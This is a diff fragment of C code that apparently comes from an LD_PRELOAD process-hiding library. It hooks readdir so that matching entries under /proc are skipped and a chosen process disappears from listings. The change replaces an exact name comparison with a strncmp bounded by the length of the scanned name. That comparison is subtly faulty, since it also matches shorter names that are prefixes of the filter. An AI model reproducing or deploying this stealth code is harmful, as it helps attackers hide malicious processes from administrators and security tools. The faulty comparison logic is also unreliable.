@@ -85,7 +85,7 @@ struct dirent* readdir(DIR *dirp)                                       \
             if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                 strcmp(dir_name, "/proc") == 0 &&                       \
                 get_process_name(dir->d_name, process_name) &&          \
-                strcmp(process_name, process_to_filter) == 0) {         \
+                strncmp(process_name, process_to_filter, strlen(process_name)) == 0) {         \
                 continue;                                               \
             }                                                           \
         }                                                               \
